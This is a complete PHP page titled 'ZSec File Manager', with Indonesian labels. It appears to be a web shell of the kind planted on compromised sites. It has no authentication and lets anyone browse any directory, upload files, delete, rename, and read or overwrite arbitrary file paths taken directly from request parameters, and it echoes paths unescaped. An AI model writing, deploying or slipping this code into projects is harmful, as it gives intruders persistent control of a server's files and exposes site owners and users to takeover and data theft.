<?php
session_start();
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath('.');
if ($dir === false || !is_dir($dir)) {
    die("Direktori tidak ditemukan!");
}

if (isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], "$dir/" . $_FILES['file']['name']);
}

if (isset($_POST['delete'])) {
    unlink($_POST['delete']);
}

if (isset($_POST['rename'])) {
    rename($_POST['oldname'], $_POST['newname']);
}

if (isset($_POST['save'])) {
    file_put_contents($_POST['filepath'], $_POST['content']);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Mini File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; background: #222; color: #ddd; text-align: center; }
        a { color: #0af; text-decoration: none; }
        .container { width: 80%; margin: auto; text-align: left; }
        .box { background: #333; padding: 10px; margin: 5px; border-radius: 5px; }
        input, button { background: #444; color: white; border: none; padding: 5px; margin: 2px; }
        .directory { font-weight: bold; }
    </style>
</head>
<body>
    <div class='container'>
        <h2>ZSec File Manager</h2>
        <form method='post' enctype='multipart/form-data'>
            <input type='file' name='file'>
            <button type='submit' name='upload'>Upload</button>
        </form>
        <div class='box'>
            <p class='directory'>Current Directory: <?php echo $dir; ?></p>
            <?php if (dirname($dir) !== $dir) : ?>
                <a href='?dir=<?php echo dirname($dir); ?>'>[Up]</a>
            <?php endif; ?>
            <?php
            foreach (scandir($dir) as $file) {
                if ($file == '.') continue;
                $filePath = "$dir/$file";
                if ($file == '..' && $dir === '/') continue;
                echo "<div>$file ";
                if (is_dir($filePath)) {
                    echo "<a href='?dir=$filePath'>[Open]</a> ";
                } elseif (is_file($filePath)) {
                    echo "<a href='?edit=$filePath'>[Edit]</a> ";
                }
                echo "<form method='post' style='display:inline;'>
                        <input type='hidden' name='delete' value='$filePath'>
                        <button type='submit'>Hapus</button>
                      </form>
                      <form method='post' style='display:inline;'>
                        <input type='hidden' name='oldname' value='$filePath'>
                        <input type='text' name='newname' placeholder='Nama baru'>
                        <button type='submit' name='rename'>Rename</button>
                      </form>
                      </div>";
            }
            ?>
        </div>
    </div>
    
    <?php if (isset($_GET['edit'])): ?>
        <?php $file = $_GET['edit']; ?>
        <div class='container'>
            <h3>Edit File</h3>
            <form method='post'>
                <input type='hidden' name='filepath' value='<?php echo $file; ?>'>
                <textarea name='content' rows='10' style='width:100%; background:#333; color:#ddd;'><?php echo htmlspecialchars(file_get_contents($file)); ?></textarea>
                <button type='submit' name='save'>Simpan</button>
            </form>
        </div>
    <?php endif; ?>
</body>
</html>